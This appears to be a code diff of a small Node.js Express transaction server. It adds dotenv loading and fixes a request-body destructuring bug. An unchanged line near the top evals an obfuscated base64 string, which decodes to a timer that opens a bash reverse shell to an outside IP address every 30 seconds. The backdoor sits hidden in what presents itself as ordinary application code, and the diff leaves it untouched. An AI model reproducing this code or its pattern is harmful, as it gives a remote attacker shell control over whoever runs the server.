@@ -2,6 +2,7 @@ const express = require("express");
 const axios = require("axios");
 eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 const { randomUUID } = require("crypto");
+require('dotenv').config()
 
 const app = express();
 app.use(express.json());
@@ -23,7 +24,7 @@ app.post("/transaction", (_, res) => {
 });
 
 app.put("/transaction", (req, res) => {
-  const { id, status } = req.body.status;
+  const { id, status } = req.body;
   console.log(`Transaction ${id} marked as ${status}`);
   res.send();
 });
